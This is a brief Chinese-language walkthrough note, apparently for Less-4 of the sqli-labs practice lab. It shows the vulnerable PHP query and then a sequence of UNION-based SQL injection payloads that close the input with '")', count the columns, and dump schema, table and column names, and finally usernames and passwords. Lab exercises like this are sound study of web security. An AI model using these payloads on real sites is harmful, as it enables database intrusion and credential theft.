---
title: less4
url: https://www.yuque.com/u29002979/ep2zrx/ntg3b3f1yd0bmxig
---

```bash
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

加双引号和括号。

`?id=1"`报错

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'order by 4-- ") LIMIT 0,1' at line 1

用")闭合
`?id=1") order by 4--+`报错
`?id=1") order by 3--+`不报错,3列

`?id=-1") union select 1,2,3 --+回显点2,3`

`?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata --+`

`?id=-1")union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+`

`?id=-1")union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+`

`?id=-1") union select 1,2,(select group_concat(username,password) from users)--+`
